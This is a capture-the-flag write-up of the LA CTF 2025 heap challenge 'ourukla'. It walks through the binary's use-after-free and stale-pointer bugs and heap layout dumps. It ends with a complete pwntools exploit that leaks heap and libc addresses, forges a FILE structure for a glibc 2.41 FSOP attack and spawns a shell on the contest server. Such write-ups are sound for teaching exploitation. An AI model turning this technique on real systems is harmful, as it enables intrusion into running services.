# Write up LA CTF 2025
## PWN
### ourukla
#### overview
```shell
pwndbg> checksec
File:     /home/thefless/Documents/LACTF/ourukla/chall_patched
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'$ORIGIN'
Stripped:   No
pwndbg>
```
- All protection have been enabled, except canary.
```shell
thefless@thefless:~/Documents/LACTF/ourukla$ strings libc.so.6 | grep "glibc"
 glibc: assert
 glibc: getrandom
 glibc: getrandom states
 glibc: fatal
 glibc: pthread stack: %u
 glibc: malloc arena
 glibc: malloc
glibc 2.41
Fatal glibc error: %s:%s (%s): assertion failed: %s
Fatal glibc error: cannot get entropy for arc4random
Fatal glibc error: failed to register TLS destructor: out of memory
Fatal error: glibc detected an invalid stdio handle
 glibc: pthread user stack: %u
Fatal glibc error: rseq registration failed
Fatal glibc error: array index %zu not less than array length %zu
Fatal glibc error: invalid allocation buffer of size %zu
Fatal glibc error: gconv module reference counter overflow
thefless@thefless:~/Documents/LACTF/ourukla$
```
- use libc 2.41.
```c
struct student_info {
    char noeditingmyptrs[0x10]; // No editing my pointers !!!
    char *name;
    unsigned long attributes;
    char major[0x40];
    char aux[0x90];
};
struct student {
    unsigned long array_id;
    unsigned long uid;
    struct student_info *sinfo;
};
struct student *ourUKLA[10] = {0};
int cur_index = 0;
```
- Size of `student` is 0x18.
- Size of `student_info` is 0x111.
```c
int main() {
    init();
    int choice;
    while (1) {
        menu();
        scanf("%d", &choice);
        switch (choice) {
            case 1:
                add_student();
                break;
            case 2:
                get_student_info();
                break;
            case 3:
                remove_student();
                break;
            default:
                puts("cmon you're an administrator don't tell me you don't know how to follow basic instructions!!");
                exit(1);
        };
    }
    return 0;
}
```
- `main` init something, do the choice.
```c
void add_student() {

    char* old_top = *((char**)puts + 0x2ccb0) + 0x10;
    struct student *s = ourUKLA[cur_index] = malloc(sizeof(struct student));
    if ((void *)old_top == (void *)s) s->sinfo = NULL;

    s->array_id = cur_index++;
    cur_index %= 10;

    printf("Enter student UID: ");
    scanf("%ld", &s->uid);
    while ((getchar()) != '\n');

    printf("Enter student information now (y/n)? You can do it later: ");
    char res = getchar();
    getchar();
    if (res == 'y') fill_student_info(s);

    printf("Student with UID %lu added at index %lu!\n", s->uid, s->array_id);
}
```
- `add_student` initializes `old_top` in a very strange way.
- `add_student` call `fill_student_info` if `res == 'y'`.
```c
void fill_student_info(struct student *s) {
    
    struct student_info *sinfo;
    if (s->sinfo == NULL) sinfo = malloc(0xf0);
    else sinfo = s->sinfo;

    char *name = malloc(0x100);
    printf("Student name: ");
    read(STDIN_FILENO, name, 0x100);
    sinfo->name = name;

    printf("Student major: ");
    read(STDIN_FILENO, sinfo->major, 0x40);

    printf("Student attributes (e.g. undergrad = 1): ");
    scanf("%lu", &sinfo->attributes);
    while ((getchar()) != '\n');
    sinfo->attributes |= HASNOLIFE | ACMCYBER;

    printf("Require space to add aux data (y/n)? ");
    char res = getchar();
    getchar();
    if (res == 'y') {
        printf("Aux data: ");
        read(STDIN_FILENO, sinfo->aux, 0x90);
    }
    s->sinfo = sinfo;
}
```
- `fill_student_info` has a arbitrary write. Because student `s` was allocated by malloc(no clear data in chunk) and `if (s->sinfo == NULL) ... else ...`. For example: I input somethings before, then I use this chunk again in other role, I can arbitrary write by `major` and `aux` in `student`.
- `fill_student_info` has a UAF. Because student `s` was allocated by malloc(no clear data in chunk) and `if (s->sinfo == NULL) ... else ...`. For example: `add_student` get chunk from bin(old data in chunk) and use this chunk. But it was free-ed and did not have any malloc.
```c
void remove_student() {

    unsigned long uid;
    printf("Enter student UID: ");
    scanf("%lu", &uid);

    for (int i = 0; i < 10; i++) {
        if (ourUKLA[i] == NULL) continue;

        if (ourUKLA[i]->uid == uid) {

            struct student_info *sinfo = ourUKLA[i]->sinfo;
            if (sinfo) {
                free(sinfo->name);
                free(sinfo);
            }
            free(ourUKLA[i]);

            ourUKLA[i] = NULL;
            return;
        }
    }
}
```
- `remove_student` free 1 chunk, that has same `uid`, and set `ourUKLA[i] = NULL`.
```c
void get_student_info() {

    unsigned long uid;
    printf("Enter student UID: ");
    scanf("%lu", &uid);

    for (int i = 0; i < 10; i++) {
        if (ourUKLA[i] == NULL) continue;

        if (ourUKLA[i]->uid == uid) {

            struct student_info *sinfo = ourUKLA[i]->sinfo;
            if (sinfo) {
                puts("STUDENT INFO");
                printf("Student Name: %s\n", sinfo->name);
                printf("Student Major: %s\n", sinfo->major);
                printf("Student Attributes (number): %lu\n", sinfo->attributes);
            }
            return;
        }
    }
}
```
- `get_student_info` print info of student, that has same `uid`,  
#### exploit
- I use the chunk in tcache bin to leak heap base.
    + `add_student` and input something, then I remove student (that move chunk into tcache bin).
    + `add_student` to get chunk from tcache. I do not input anything.
    + `get_student_info` to leak heap base.
- I use the chunk in small bin to leak libc base.
    + `add_student` 8 times.
    + `remove_student` 8 times (7 times move chunk into tcache bin, 1 time move chunk into small bin). This function performs operations in the reverse order of `add_student` to prevent the chunk from coalescing with the top chunk.
    + `add_student` 8 times. I do not input anything.
    + `get_student_info` to leak libc base.
- I use `add_student` multiple times to drain the bin and return the heap to a clean state.
- I manipulated the heap layout to place another chunk into the small bin. Since this was deterministic, I injected specific addresses into the chunk to achieve an arbitrary write.
```shell
0x58a6c0d9fad0	0x0000000000000000	0x0000000000000021	........!....... <-- fastbins[0x20][0]
0x58a6c0d9fae0	0x000000058a6c0d9f	0x0000000000000015	..l.............
0x58a6c0d9faf0	0x000058a6c0d9fb00	0x0000000000000211	.....X.......... <-- smallbins[0x210][0]
0x58a6c0d9fb00	0x0000767e5b739d20	0x0000767e5b739d20	 .s[~v.. .s[~v..
0x58a6c0d9fb10	0x000058a6c0d9fc00	0x0000000000000030	.....X..0.......
0x58a6c0d9fb20	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x58a6c0d9fb30	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x58a6c0d9fb40	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x58a6c0d9fb50	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x58a6c0d9fb60	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fb70	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fb80	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fb90	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fba0	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fbb0	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fbc0	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fbd0	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fbe0	0x4343434343434343	0x4343434343434343	CCCCCCCCCCCCCCCC
0x58a6c0d9fbf0	0x0000000000000000	0x0000000000000111	................
0x58a6c0d9fc00	0x0000767e5b739c20	0x0000767e5b739c20	 .s[~v.. .s[~v..
0x58a6c0d9fc10	0x0000767e5b73a4d0	0x0000767e5b73a4d0	..s[~v....s[~v..
0x58a6c0d9fc20	0x0000767e5b73a4d0	0x0000767e5b73a4d0	..s[~v....s[~v..
0x58a6c0d9fc30	0x0000767e5b73a4a0	0x0000767e5b73a4a0	..s[~v....s[~v..
0x58a6c0d9fc40	0x0000767e5b73a4a0	0x0000767e5b73a4a0	..s[~v....s[~v..
0x58a6c0d9fc50	0x0000767e5b73a4a0	0x0000767e5b73a4a0	..s[~v....s[~v..
0x58a6c0d9fc60	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fc70	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fc80	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fc90	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fca0	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fcb0	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fcc0	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fcd0	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fce0	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fcf0	0x0000000000000000	0x0000000000000000	................
0x58a6c0d9fd00	0x0000000000000210	0x0000000000000020	........ .......
0x58a6c0d9fd10	0x0000000000000008	0x0000000000000016	................
0x58a6c0d9fd20	0x000058a6c0d9fd30	0x0000000000000101	0....X..........
0x58a6c0d9fd30	0x0000000000000000	0x0000000000000000	................
```
- I use `add_student` multiple times to drain the tcache.
- The allocation for struct `student` is serviced by the fast bin, but it reuses a previously freed `student_info` chunk from the small bin (which had been consolidated). Consequently, the allocation for the name field overlaps with the `student_info` structure.
- Subsequent allocations for struct student continue to be carved out of this same small bin chunk. Crucially, these new allocations overlap with the `name` field of the initial chunk. Since we control the content of `name`, we effectively gain an arbitrary write primitive over the new struct `student` objects.
- I overwrite `stderr` in libc to FSOP attack.

#### Other exploit
- We can overwrite `IO_list_all = heap_address`. This is easier than overwriting `stderr`.
- We can use exploit heap to ROPchain.
- With an arbitrary read/write primitive, there are multiple avenues to exploit this challenge.
#### Proof of Concepts
```python
#!/usr/bin/python3
from pwn import *


# Edit these placeholders: ./binary ./libc.so.6 amd64
context.binary = exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
context.arch = "amd64"


script = '''
# b*main+50
# c
set debuginfod enable on
b*exit
b*_IO_flush_all
c
'''
env = {
    "LD_LIBRARY_PATH": ".",
    "GLIBC_TUNABLES": "glibc.cpu.hwcaps=-all"
}

p = remote("chall.lac.tf" , port = 31147)
# p = gdb.debug(
#     exe.path,
#     gdbscript = script,
#     env=env
# )

def slog(name , addr): return success(": ".join([name , hex(addr)]))
def s(payload):
    sleep(1.5)
    p.send(payload)
def sl(payload):
    sleep(1.5)
    p.sendline(payload)
def sa(info , payload):
    p.sendafter(info , payload)
def sla(info , payload):
    p.sendlineafter(info , payload)
def ru(payload):
    return p.recvuntil(payload)
def rn(payload):
    return p.recvn(payload)
def rln():
    return p.recvline()

def create(uid , name , major , attributes , aux , ok , okname):
    sla(b'Option > ' , b'1')
    sla(b'UID: ' , str(uid).encode())
    sla(b'Enter student information now (y/n)? You can do it later: ' , okname)
    if okname == b'y':
        sa(b'Student name: ' , name)
        sa(b'Student major: ' , major)
        sla(b'Student attributes (e.g. undergrad = 1): ' , str(attributes))
        sla(b'Require space to add aux data (y/n)? ' , ok)
        if ok == b'y':
            sa(b'Aux data: ' , aux)

def show(uid):
    sla(b'Option > ' , b'2')
    sla(b'UID: ' , str(uid).encode())

def delete(uid):
    sla(b'Option > ' , b'3')
    sla(b'UID: ' , str(uid).encode())

for i in range(1 , 9):
    create(64 + i , b'A' , b'B' , 0 , b'C' , b'y' , b'y')
delete(65)
for i in range(8 , 1 , -1):
    if i == 2: continue
    delete(64 + i)
delete(66)
for i in range(1 , 9):
    create(64 + i , b'A' , b'B' , 0 , b'C' , b'n' , b'n')
show(71)
ru(b'Student Name: ')
heap = (u64(rn(5) + b'\x00' * 3) << 12) - 0x1000
slog("heap" , heap)

show(72)
ru(b'Student Name: ')
libc.address = u64(rn(6) + b'\x00' * 2) - 0x1e6c20
slog("libc base" , libc.address)
IO_list_all = libc.address + 0x1e74c0
for i in range(10):
    create(i , b'A' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')

# chunk = heap + 0x3920
chunk = libc.sym._IO_2_1_stdout_ - 0xd0 - 0x20
chunk2 = IO_list_all - 0x20
for i in range(10):
    if i == 1:
        create(20 + i , p64(chunk) * 0x6 + p64(chunk2) * 0x6 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
    else: create(20 + i , b'A' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
for i in range(9 , 2 , -1):
    delete(20 + i)
delete(21)
for i in range(3 , 10):
    create(20 + i , b'A' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
fp = FileStructure()
fp.flags = u32("  sh")
fp.vtable = libc.sym._IO_wfile_jumps
fp._wide_data = heap + 0x40b0
fp._IO_read_ptr = 0
fp._IO_read_end = 0
fp._IO_read_base = 0
fp._IO_write_ptr = 1
fp._IO_write_end = 0
fp._IO_write_base = 0
fp._IO_buf_end = 0
fp._IO_buf_base = 0
fp._lock = libc.address + 0x1e87b0
print(hex(len(fp)))

create(31 , b'D' * 0x100 , b'B' * 0x40 , 0 , b'C' * 0x90 , b'y' , b'y')
create(32 , b'D' * 0x100 , bytes(fp)[-0xD0 : -0x90] , 0 , bytes(fp)[-0x90:] , b'y' , b'y')
create(33 , b'D' * 0x100 , p64(libc.sym._IO_2_1_stderr_) + b'\x00' * 0x18 + p64(u32("  sh")) + p64(0) , 0 , b'\x00' , b'y' , b'y')
create(34 , flat({
    0x68:[libc.sym.system],
    0xe0:[heap + 0x40b0],
} , filler = b'\x00') , b'A' * 0x40 , 0 , b'\x00' , b'y' , b'y')
sla(b'Option > ' , b'4')
p.interactive()
```
